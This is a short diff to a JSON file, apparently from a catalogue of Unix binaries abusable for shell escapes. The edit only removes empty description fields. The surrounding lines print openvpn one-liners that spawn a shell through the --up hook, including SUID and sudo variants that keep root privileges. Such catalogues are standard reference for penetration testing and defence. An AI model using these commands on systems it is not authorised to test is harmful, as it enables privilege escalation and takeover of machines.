@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
       }
     ],
@@ -14,7 +14,7 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
       },
       {
@@ -24,7 +24,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
       },
       {
